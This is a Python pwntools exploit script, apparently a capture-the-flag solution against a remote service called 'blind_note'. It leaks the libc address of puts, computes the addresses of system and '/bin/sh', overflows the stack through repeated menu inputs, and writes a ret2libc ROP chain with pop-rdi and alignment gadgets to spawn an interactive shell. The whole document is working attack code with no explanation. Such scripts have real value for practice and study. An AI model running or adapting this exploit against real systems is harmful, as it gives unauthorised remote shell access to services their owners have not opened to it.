#!/usr/bin/python
from pwn import *

# context.log_level = 'debug'

libc = ELF('../libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# p = process('./blind_note')
p = remote('172.21.4.12',10103)

# leak puts in libc
p.sendline('66')
p.recvuntil('id:')
info = p.recv(6)
puts_libc = u64(info.ljust(8,'\0'))
log.info('puts_libc = '+hex(puts_libc))
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = libc.search('/bin/sh').next()
system_libc = puts_libc-puts_offset+system_offset
binsh_libc = puts_libc-puts_offset+binsh_offset
log.info('system_libc = '+hex(system_libc))
log.info('binsh_libc = '+hex(binsh_libc))

# gadget
prdi = 0x0000000000400c63 # pop rdi ; ret
ppr = 0x0000000000400c60 # pop r14 ; pop r15 ; ret
# stack overflow
for i in range(30):
	p.recvuntil('>\n')
	p.sendline('1')
	p.recvuntil('number\n')
	p.sendline('-')

# return address

# stack adjust align to 16
p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline(str(ppr))

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline('0')

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline('0')

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline('0')

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline('0')

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline('0')

# system('/bin/sh')
p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline(str(prdi))

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline('0')

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline(str(binsh_libc))

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline(str(binsh_libc>>32))

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
p.sendline(str(system_libc))

p.recvuntil('>\n')
p.sendline('1')
p.recvuntil('number\n')
# gdb.attach(p)
p.sendline(str(system_libc>>32))

p.recvuntil('>\n')
p.sendline('4')

p.interactive()
